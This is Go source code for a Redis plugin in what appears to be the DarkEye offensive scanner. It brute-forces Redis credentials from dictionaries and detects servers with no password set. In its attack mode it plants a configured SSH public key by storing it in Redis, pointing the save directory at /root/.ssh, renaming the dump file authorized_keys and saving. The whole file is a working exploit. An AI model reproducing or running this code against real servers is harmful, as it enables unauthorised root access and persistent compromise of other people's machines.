package plugins

import (
	"context"
	"fmt"
	"github.com/go-redis/redis"
	"github.com/zsdevX/DarkEye/superscan/dic"
	"strings"
	"time"
)

func redisCheck(s *Service) {
	s.crack()
}

func redisConn(parent context.Context, s *Service, _, pass string) (ok int) {
	ok = OKNext
	client := redis.NewClient(&redis.Options{
		Addr:        s.parent.TargetIp + ":" + s.parent.TargetPort,
		Password:    pass,
		DB:          0,
		DialTimeout: time.Millisecond * time.Duration(Config.TimeOut),
	})
	ctx, _ := context.WithCancel(parent)
	defer func() {
		if ok == OKDone || ok == OKNoAuth {
			if !Config.Attack {
				ret, err := client.ConfigSet(ctx, "dir", "/root/.ssh").Result()
				s.parent.Result.Output.Set("helper", fmt.Sprintf("Try linux root access: '%v' error '%v'\n", ret, err))
			} else {
				if _, err := client.Set(ctx,
					"OxOx", Config.SshPubKey, 0).Result(); err != nil {
					s.parent.Result.Output.Set("helper", fmt.Sprintf("Redis attack: error '%v'\n", err))
					return
				}
				if _, err := client.ConfigSet(ctx, "dir", "/root/.ssh").Result(); err != nil {
					s.parent.Result.Output.Set("helper", fmt.Sprintf("Redis attack: error '%v'\n", err))
					return
				}
				if _, err := client.ConfigSet(ctx, "dbfilename", "authorized_keys").Result(); err != nil {
					s.parent.Result.Output.Set("helper", fmt.Sprintf("Redis attack: error '%v'\n", err))
					return
				}
				if _, err := client.Save(ctx).Result(); err != nil {
					s.parent.Result.Output.Set("helper", fmt.Sprintf("Redis attack: error '%v'\n", err))
					return
				}
				s.parent.Result.Output.Set("helper", "Redis attack successfully\n")
			}
		}
		_ = client.Close()
	}()

	pong, err := client.Ping(ctx).Result()
	if err == nil {
		if strings.Contains(pong, "PONG") {
			ok = OKDone
		} else {
			ok = OKStop
		}
	} else {
		if strings.Contains(err.Error(), " without any password configured") {
			ok = OKNoAuth
			return
		}
		//账号密码错误
		if strings.Contains(err.Error(), "username-password") ||
			strings.Contains(err.Error(), "OAUTH Authentication required") {
			return
		}
		if strings.Contains(err.Error(), "connection reset by peer") {
			//连接限制
			ok = OKWait
			return
		}
		if strings.Contains(err.Error(), "i/o timeout") {
			ok = OKTimeOut
			return
		}
		if strings.Contains(err.Error(), " protected mode") {
			//配置限制访问
			ok = OKForbidden
			return
		}
		ok = OKStop
	}
	return
}

func init() {
	services["redis"] = Service{
		name:    "redis",
		port:    "6379",
		user:    dic.DIC_USERNAME_REDIS,
		pass:    dic.DIC_PASSWORD_REDIS,
		check:   redisCheck,
		connect: redisConn,
		thread:  1,
	}
}
